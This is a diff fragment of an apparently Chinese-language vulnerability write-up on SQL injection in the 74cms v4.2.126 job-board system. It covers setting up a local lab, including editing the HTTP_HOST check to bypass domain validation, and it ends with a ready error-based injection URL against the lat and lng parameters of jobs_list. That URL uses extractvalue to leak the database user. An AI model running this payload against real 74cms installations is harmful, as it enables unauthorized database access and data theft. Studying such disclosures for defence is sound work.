@@ -17,7 +17,7 @@ source: "hatch 补库批 20260928"
 ======================
 
 1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5，
-搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php6， 查找所有\$\_SERVER\[\'HTTP\_HOST\'\] 改为  <http://baidu.com> 即可
+搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php6， 查找所有\$\_SERVER\[\'HTTP\_HOST\'\] 改为  <http://baidu.com> 即可
 
 0x02 数据填充不然没得测试
 =========================
@@ -43,7 +43,7 @@ source: "hatch 补库批 20260928"
 
 ![](./.resource/74cmsv4.2.126-前台四处sql注入/media/rId33.png)
 
-这样的话只要点击完以后有数据 你在 lat  lng  字段都可以正常的进行注入
+这样的话只要点击完以后有数据 你在 lat  lng  字段都可以正常的进行注入
 
     Payload: 
     http://74cms.test/index.php?m=&c=jobs&a=jobs_list&lat=23.176465&range=20&lng=113.35038 PI() / 180 - map_x  PI() / 180) / 2),2))) * 1000) AS map_range FROM qs_jobs_search j WHERE (extractvalue (1,concat(0x7e,(SELECT USER()), 0x7e))) -- a
